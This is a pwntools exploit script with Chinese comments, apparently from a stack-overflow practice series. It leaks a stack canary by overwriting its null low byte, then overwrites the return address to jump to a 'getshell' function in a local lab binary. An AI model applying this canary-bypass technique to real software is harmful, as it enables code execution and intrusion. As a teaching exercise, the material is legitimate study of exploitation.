# !/usr/bin/python3
'''
覆盖00字符读出canary
# 原理
canary的值设计为以0x00结尾，防止read，printf灯函数直接读出
通过栈溢出覆盖最低位的字节，从而获得canary
file: a01_stack_08_canary_01_by_read_printf_2times.c

v3 = __readgsdword(0x14u);
for ( i = 0; i <= 1; ++i )
{
  read(0, buf, 0x200u);
  printf(buf);
}
return __readgsdword(0x14u) ^ v3;

offset
0x5655573a <vuln+24>        mov    DWORD PTR [ebp-0xc], eax ;$epb-0xc=0xffffd10c
canary: 0xffffd10c
0x56555756 <vuln+52>        call   0x565554f0 <read@plt>
read@plt (
   [sp + 0x0] = 0x00000000, //STDIN
   [sp + 0x4] = 0xffffd0a8 → 0x00000001,  //buf
   [sp + 0x8] = 0x00000200   //num of char
)
0xffffd10c - 0xffffd0a8 = 100
'''
from pwn import *

context(os='linux', arch='i386', log_level='debug')
sh = process('a')
# gdb.attach(sh)
offset = 100
padding = b'A' * offset
# get canary
sh.sendlineafter('Hello Hacker!\n', padding)
sh.recvuntil(padding)
canary = u32(sh.recv(numb=4)) - ord('\n')
print('canary = ' + hex(canary))

# getshell
getshell = ELF('a').sym['getshell']

'''exp
'A'*4:  $ebp of caller
canary+'A'*8:  DWORD PTR [ebp-0xc], eax, actually, the canary take up 0xC byte
'''

exp = flat(padding, canary, 'A' * 8, b'A' * 4, getshell)
sh.send(exp)
sh.recv()
sh.interactive()
